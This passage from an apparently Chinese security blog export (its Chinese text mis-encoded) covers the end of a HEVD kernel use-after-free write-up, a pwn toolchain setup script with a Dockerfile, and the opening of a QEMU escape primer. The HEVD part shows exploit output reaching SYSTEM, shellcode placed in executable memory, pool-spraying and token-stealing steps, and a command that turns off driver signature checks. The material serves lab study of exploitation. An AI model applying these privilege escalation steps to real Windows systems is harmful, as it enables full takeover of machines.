<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>\<span class="title">Desktop</span>\<span class="title">HEVDExploit.exe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">use</span> <span class="title">write</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Create</span> <span class="title">UAF</span> <span class="title">Object</span> <span class="title">then</span> <span class="title">free</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Prepare</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">to</span> <span class="title">get</span> <span class="title">the</span> <span class="title">UAF</span> <span class="title">object</span> <span class="title">then</span> <span class="title">write</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Trigger</span> <span class="title">UAF</span> <span class="title">callback</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [ç‰ˆæœ¬ 10.0.19045.3930]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>ã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<p>tip: kernelå¯ä»¥è®¿é—®VirtualAllocçš„å†…å­˜åŒºåŸŸï¼Œä½†æ˜¯æœ€å¥½ä¸å…è®¸æ¢å‡ºå†…å­˜ã€‚</p>
<p>å› ä¸º NonPagedPool æ˜¯æœ‰å¯æ‰§è¡Œæƒé™çš„ğŸ˜¢</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LPVOID pShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pShellcode, StealToken, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LPVOID pKernelStack = <span class="built_in">VirtualAlloc</span>((LPVOID)stackAddr, <span class="number">0x14000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualLock</span>(pKernelStack, <span class="number">0x14000</span>)) &#123;</span><br><span class="line">	<span class="built_in">Error</span>(<span class="string">&quot;VirtualLock&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>å› ä¸ºè¿™é‡Œçš„å†…å­˜æ± æ˜¯NonPagedPoolï¼Œå­˜åœ¨å¯æ‰§è¡Œæƒé™ï¼Œå› æ­¤æ˜¯å¯ä»¥å†™shellcodeçš„</p>
<p>å‚è€ƒçš„æ–‡ç« ï¼Œæ± é£æ°´ä½¿ç”¨äº†NamedPipeï¼Œå¯èƒ½æ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸ºNamedPipeåœ¨NonPagedPoolNxä¸­è·å¾—ï¼Œä¸æ˜¯ä¸€ä¸ªpoolï¼Œå› æ­¤æ²¡å¿…è¦spray named pipe</p>
<h3 id="Exploit-NonPagedPoolNx"><a href="#Exploit-NonPagedPoolNx" class="headerlink" title="Exploit NonPagedPoolNx"></a>Exploit NonPagedPoolNx</h3><p>æ²¡æœ‰æ‰§è¡Œæƒé™</p>
<p>NonPagedPoolçš„expä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p>å…¶ä½™åšæ³•ï¼š<a href="https://github.com/vportal/HEVD/blob/main/README.md">HEVD</a></p>
<ul>
<li>ä½¿ç”¨FakeObjæ¥ä¼ªé€ ä¸€ä¸ªNamedPipeï¼Œç»“åˆdouble freeä»è€Œå¯ä»¥ä»»æ„çš„è¯»</li>
<li>ä½¿ç”¨NtFsControlFileå°†NamedPipeæ”¹æˆunbuffered</li>
<li>ä¿®æ”¹ Irp-&gt;SystemBuffer ä»»æ„å†™</li>
</ul>
<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Windows æ— æ³•éªŒè¯æ­¤è®¾å¤‡æ‰€éœ€çš„é©±åŠ¨ç¨‹åºçš„æ•°å­—ç­¾åã€‚æŸè½¯ä»¶æˆ–ç¡¬ä»¶æœ€è¿‘æœ‰æ‰€æ›´æ”¹ï¼Œå¯èƒ½å®‰è£…äº†ç­¾åé”™è¯¯æˆ–æŸæ¯çš„æ–‡ä»¶ï¼Œæˆ–è€…å®‰è£…çš„æ–‡ä»¶å¯èƒ½æ˜¯æ¥è·¯ä¸æ˜çš„æ¶æ„è½¯ä»¶ã€‚</p>
<ul>
<li>æ›´æ–°ä¸å®‰å…¨-&gt;æ¢å¤-&gt;é«˜çº§å¯åŠ¨-&gt;ç«‹åˆ»é‡æ–°å¯åŠ¨-&gt;ç–‘éš¾è§£ç­”-&gt;é«˜çº§é€‰é¡¹-&gt;ç¦ç”¨é©±åŠ¨å¼ºåˆ¶ç­¾åï¼ˆF7</li>
</ul>
<p>æ°¸ä¹…ç¦ç”¨é©±åŠ¨ç­¾åï¼Ÿä¸è¡Œï¼Ÿ</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> nointegritychecks on</span><br></pre></td></tr></table></figure>

<p>åŠ è½½HEVDé©±åŠ¨ï¼Œæˆ‘ä»¬å¾—å…ˆæ‰¾åˆ°å…¶é©±åŠ¨ç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ›å»ºç›®å½•ï¼Œå°†pdbæ–‡ä»¶æ‰”è¿›å»</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !sym noisy</span><br><span class="line">noisy <span class="built_in">mode</span> - symbol prompts on</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºç¬¦å·</span><br><span class="line"><span class="number">0</span>: kd&gt; x /D HEVD!*</span><br><span class="line"> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">SYMSRV:  <span class="title">BYINDEX</span>: 0<span class="title">x8</span></span></span><br><span class="line"><span class="function">         <span class="title">c</span>:\<span class="title">symbols</span>*<span class="title">https</span>://<span class="title">msdl.microsoft.com</span>/<span class="title">download</span>/<span class="title">symbols</span></span></span><br><span class="line"><span class="function">         <span class="title">HEVD.pdb</span></span></span><br><span class="line"><span class="function">         1<span class="title">A8235FDCA7F46E08A07A47D79B5A8991</span></span></span><br><span class="line"><span class="function"><span class="title">SYMSRV</span>:  <span class="title">UNC</span>: <span class="title">c</span>:\<span class="title">symbols</span>\<span class="title">HEVD.pdb</span>\1<span class="title">A8235FDCA7F46E08A07A47D79B5A8991</span>\<span class="title">HEVD.pdb</span> - <span class="title">path</span> <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function">...</span></span><br></pre></td></tr></table></figure>

<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>ç¿»åˆ°äº†ä¸€ç¯‡CVEåˆ†æï¼Œå…¶ä¸­åˆ©ç”¨åˆ°äº†tokenæ›¿æ¢æŠ€æœ¯ï¼š<a href="https://bbs.kanxue.com/thread-277554.htm">CVE-2022-37969 æ¼æ´åˆ©ç”¨</a>,ä¸€ä¸ªä¼˜ç§€çš„åˆ©ç”¨å¯¹è±¡ï¼špipe</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ä¼šåœ¨å†…æ ¸ç©ºé—´åˆ›å»º <code>PipeAttribute</code>ï¼ŒPipeAttributeç»“æ„æ˜¯åœ¨<code>PagedPool</code>ä¸­åˆ†é…çš„å†…æ ¸ç©ºé—´ä¸­å±æ€§çš„è¡¨ç¤ºï¼Œæ„é€ åå¯ä»¥é€ æˆä»»æ„åœ°å€çš„è¯»å†™</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span> &#123;</span><br><span class="line">    LIST_ENTRY list ;</span><br><span class="line">    <span class="type">char</span> * AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> * AttributeValue;</span><br><span class="line">    <span class="type">char</span> data [<span class="number">0</span>];</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line"> &#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤å¯ä»¥ä¸å†™æ±‡ç¼–è€Œè¾¾åˆ°steal token çš„ç›®çš„</p>
<ul>
<li>ä½¿ç”¨é€‚å½“çš„å‚æ•°è°ƒç”¨<code>NtQuerySystemInformation</code> APIè·å–å½“å‰è¿›ç¨‹å’Œæ‹¥æœ‰SYSTEMç‰¹æƒçš„Systemè¿›ç¨‹ï¼ˆPID 4ï¼‰çš„_EPROCESSå’Œ_TOKEN</li>
<li>è°ƒç”¨OpenProcessTokenå‡½æ•°æ‰“å¼€ä¸å½“å‰è¿›ç¨‹å…³è”çš„è®¿é—®ä»¤ç‰Œ</li>
<li>æ ¹æ®æ¼æ´æ›¿æ¢token</li>
</ul>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul>
<li><a href="https://mdanilor.github.io/posts/">Posts (mdanilor.github.io)</a></li>
<li><a href="https://paper.seebug.org/1743/">Scoop the Windows 10 pool !</a></li>
<li><a href="https://bbs.kanxue.com/thread-276550.htm">winææƒæ¼æ´æ–‡ç« æ”¶é›†</a></li>
<li><a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUrzLtg0D7uP+D&alichlgref=https://xz.aliyun.com/">Windowså†…æ ¸åˆ©ç”¨å°æ€»ç»“</a></li>
<li><a href="https://www.alex-ionescu.com/?p=231">Sheep Year Kernel Heap Fengshui</a></li>
<li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Sheep Year Kernel Heap Fengshui: Spraying in the Big Kidsâ€™ Pool</a></li>
</ul>
]]></content>
      <categories>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-INIT</title>
    <url>/2023/06/05/PWN%20ENV%20INIT/</url>
    <content><![CDATA[<blockquote>
<p>æ­å»ºä¸€ä¸ªpwnç¯å¢ƒã€‚</p>
</blockquote>
<span id="more"></span>

<ul>
<li><code>apt</code> or <code>apt-get</code>? è™½ç„¶æˆ‘ä½¿ç”¨aptå‡ºç°warning,ä½†æ˜¯ä¾ç„¶èƒ½ç”¨<ul>
<li>åœ¨è„šæœ¬ä¸­ï¼Œæ›´åŠ æ¨è <code>apt-get</code></li>
<li><code>-y</code> yes é¿å…äº¤äº’è€Œäº§ç”Ÿé”™è¯¯</li>
</ul>
</li>
</ul>
<h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote>
<p>å®‰è£…å¿…å¤‡çš„åº”ç”¨</p>
</blockquote>
<p>rootä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·æ— æ³•ä½¿ç”¨<code>gdbæ’ä»¶</code>åŠŸèƒ½ï¼Œå› ä¸ºgdbinitæ–‡ä»¶çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ä¸€ä»½åˆ°è‡ªå·±çš„ç”¨æˆ·ç›®å½•ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># pythonå·¥å…·</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># æ¢æºï¼Œå¯é€‰</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gemæº</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker è‡ªå·±é€‰æ‹©</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu è‡ªå·±é€‰æ‹©</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>æ­å»ºæ›´åŠ å®¹æ˜“</p>
<p>ç”±äºæŸäº›é¢˜ç›®æ²¡æœ‰Libcç‰ˆæœ¬ï¼Œè€Œæ˜¯ç»™å‡ºäº†Dockerfileã€‚æˆ–è€…è¯´ï¼Œä¸æƒ³ä¸‹è½½è™šæ‹Ÿæœºã€‚</p>
<ul>
<li>glibc-all-in-one ä¸‹è½½ä¸€ä¸ªlibc è¿›è¡Œpatch(ä½†æ˜¯<code>patchelf</code>å®¹æ˜“å¯¼è‡´ç¨‹åºç ´å).</li>
<li>è‡ªå·±çš„dockerç¯å¢ƒ</li>
</ul>
<p>dockerç¯å¢ƒæ­å»º: æ›´æ”¹VERSIONå°±è¡Œï¼Œç¦æ­¢äº¤äº’ã€‚</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># å®šä¹‰æ—¶åŒºå‚æ•°</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶åŒº</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure>

<p>pwninit: åªéœ€è¦å®‰è£…éƒ¨åˆ†å·¥å…·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># æ¢æºï¼Œå¯é€‰</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªå®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f æŒ‡å®šdockerfile</span></span><br><span class="line"><span class="comment"># repo å½¢å¼ xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir å…±äº«æ–‡ä»¶å¤¹</span></span><br></pre></td></tr></table></figure>

<p>docker å‘½ä»¤</p>
<ul>
<li>-i: äº¤äº’å¼</li>
<li>-t: terminl</li>
<li>-v hostDir:dockerDir å…±äº«æ–‡ä»¶å¤¹</li>
<li>ps -a: æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨</li>
</ul>
<p>åœæ­¢åé‡æ–°è®¡å…¥å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<p>åœæ­¢å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤é•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<h4 id="æŠ¥é”™å¤„ç†"><a href="#æŠ¥é”™å¤„ç†" class="headerlink" title="æŠ¥é”™å¤„ç†"></a>æŠ¥é”™å¤„ç†</h4><p>error 1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure>

<p>error 2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure>

<p>å‡ºç°äº†å¦‚ä¸Šé”™è¯¯ã€‚å¯»æ‰¾åˆ°ä¸€ä¸ª<a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p>
<ul>
<li>error1ï¼Œä¿®æ”¹dockerfileçš„ç±»ä¼¼å¦‚ä¸‹å˜é‡ã€‚é€‰æ‹©ä¸­å›½</li>
<li>error2  ä¹Ÿè§£å†³äº†ã€‚</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘ä»¬çš„è®¾ç½®</span></span><br><span class="line"><span class="comment"># å®šä¹‰æ—¶åŒºå‚æ•°</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶åŒº</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><p>åˆ›å»ºå¤šä¸ªdockerã€‚</p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Qemu-escape</title>
    <url>/2024/02/19/Qemu%20escape/</url>
    <content><![CDATA[<blockquote>
<p>è™šæ‹Ÿæœºé€ƒé€¸å®åœ¨æ˜¯æ³°è£¤è¾£ï¼ï¼ï¼</p>
</blockquote>
<span id="more"></span>

<h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="qemu-mode"><a href="#qemu-mode" class="headerlink" title="qemu mode"></a>qemu mode</h3><ol>
<li>User modeï¼šç”¨æˆ·æ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒQEMU è¿è¡ŒæŸä¸ªå•ä¸€çš„ç¨‹åºï¼Œå¹¶ä¸”é€‚é…å…¶çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³åœ¨x86æœºå™¨ä¸Šè¿è¡Œarmç¨‹åºå¯ä»¥é€‰æ‹©</li>
<li>System modeï¼šç³»ç»Ÿæ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒQEMU å¯ä»¥æ¨¡æ‹Ÿå‡ºä¸€ä¸ªå®Œæ•´çš„è®¡ç®—æœºç³»ç»Ÿã€‚</li>
<li>KVMï¼šKVMï¼ˆKernel-based Virtual Machineï¼ŒåŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼‰æ˜¯ä¸€ç§ TYPE1 Hypervisor è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ŒVMM å’Œ HostOS ä¸€ä½“åŒ–ï¼Œç›´æ¥è¿è¡Œ Host Hardware ä¹‹ä¸Šï¼Œå®ç°ç¡¬ä»¶å’Œè™šæ‹Ÿæœºå®Œå…¨ç®¡æ§ã€‚</li>
<li>Xenï¼šXenæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç è™šæ‹Ÿæœºç›‘è§†å™¨ï¼Œç”±å‰‘æ¡¥å¤§å­¦å¼€å‘ã€‚Xençš„ç¼ºç‚¹æ˜¯æ“ä½œç³»ç»Ÿå¿…é¡»è¿›è¡Œæ˜¾å¼åœ°ä¿®æ”¹ï¼ˆç§»æ¤ï¼‰ä»¥åœ¨Xenä¸Šè¿è¡Œï¼ˆä½†æ˜¯æä¾›å¯¹ç”¨æˆ·åº”ç”¨çš„å…¼å®¹æ€§ï¼‰ï¼Œæ‰€ä»¥æ¯”è¾ƒéº»çƒ¦ã€‚ä½¿å¾—Xenæ— éœ€ç‰¹æ®Šç¡¬ä»¶æ”¯æŒï¼Œå°±èƒ½è¾¾åˆ°é«˜æ€§èƒ½çš„è™šæ‹ŸåŒ–ã€‚</li>
</ol>
<h3 id="å†…å­˜ç»“æ„"><a href="#å†…å­˜ç»“æ„" class="headerlink" title="å†…å­˜ç»“æ„"></a>å†…å­˜ç»“æ„</h3><p>æ¯ä¸ªqemuè™šæ‹Ÿæœºéƒ½æ˜¯å®¿ä¸»æœºä¸Šçš„ä¸€ä¸ª<strong>è¿›ç¨‹</strong>ï¼Œåœ¨è¿›ç¨‹ä¸­ç”¨mmapåˆ†é…å‡ºå¤§å°ä¸º0x40000000å­—èŠ‚çš„å®¿ä¸»æœºçš„è™šæ‹Ÿå†…å­˜æ¥ä½œä¸ºè™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜</p>
<p>ä¸€ä¸ªç»å…¸çš„å†…å­˜ç»“æ„å›¾<a href="https://aidaip.github.io/binary/2021/03/11/VM-escape-QEMU-Case-Study.html">(1)</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual 